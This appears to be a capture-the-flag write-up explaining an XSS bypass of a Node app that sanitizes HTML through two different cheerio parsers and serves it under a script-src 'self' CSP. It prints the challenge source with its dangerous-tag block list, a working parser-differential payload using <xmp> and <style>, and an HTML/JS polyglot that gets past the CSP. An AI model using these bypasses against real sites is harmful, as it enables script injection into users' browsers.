### Double parser

The challenge was to execute an XSS in the following application:

```js
import fastify from "fastify";
import * as cheerio from "cheerio";
import fs from "node:fs";

const app = fastify();

// Do not use dangerous tags.
const validateTags = ($) => {
  const DANGEROUS_TAGS = [
    "script",
    "noscript",
    "iframe",
    "frame",
    "object",
    "embed",
    "template",
    "meta",
    "svg",
    "math",
  ];
  return $(DANGEROUS_TAGS.join(",")).length === 0;
};

const validate = (html0) => {
  if (typeof html0 !== "string") throw "Invalid type";
  if (html0.length > 1024) throw "Too long";
  if (/[^\r\n\x20-\x7e]/.test(html0)) throw "Invalid characters";

  // Parser 1: parse5
  // ref. https://cheerio.js.org/docs/advanced/configuring-cheerio#parsing-html-with-parse5
  const $1 = cheerio.load(html0);
  if (!validateTags($1)) console.error("Invalid tags: Parser 1");
  const html1 = $1.html(); 

  // Parser 2: htmlparser2
  // ref. https://cheerio.js.org/docs/advanced/configuring-cheerio#using-htmlparser2-for-html
  const $2 = cheerio.load(html1, { xml: { xmlMode: false } });
  if (!validateTags($2)) console.error("Invalid tags: Parser 2");
  const html2 = $2.html();


  return html2;
};

const defaultHtml = fs.readFileSync("index.html", { encoding: "utf8" });

app.get("/", async (req, reply) => {
  try {
    const html = validate(req.query.html ?? defaultHtml);
    reply
      .type("text/html; charset=utf-8")
      .header("Content-Security-Policy", "script-src 'self'")
      .send(html);
  } catch (err) {
    reply.type("text/plain").code(400).send(err);
  }
});

app.listen({ port: 3000, host: "0.0.0.0" });
```

The app sanitizes the input twice through `parse5` and `htmlparser2`. Bypassing the 1st parser was difficult and in most of our testing it was following Chrome implementation. However, bypassing the second parser was quite eassy as it didn't distinguish between text nodes like `<xmp>` or `<noframes>` and treated the content inside them as elements. 

The easiest bypass is as the following: 

```html
<xmp><style></xmp><script>alert()</script></xmp></xmp></style></xmp>
```

but it will be blocked by the first parser. After some trial an error, we've crafted

```html
<xmp><a/id="</xmp><a/id="><style></xmp><script/src='?html=<!%0aalert()//'></script>">
```

Which was passing through the 1st parser and was executing an alert by the second. The reason is that the `htmlparser2` escapes `<` and `>` to `&lt;` and `&gt;` and converted it to:

```html
<xmp><a/id="&lt;/xmp&gt;&lt;a/id="><style></xmp><script/src='?html=<!%0aalert()//'></script>">
```

After which, the `<script>` executes.

One last piece of the solution was to bypass the CSP and we did with the html/js plyglot:

```js
<!--
alert()//
```
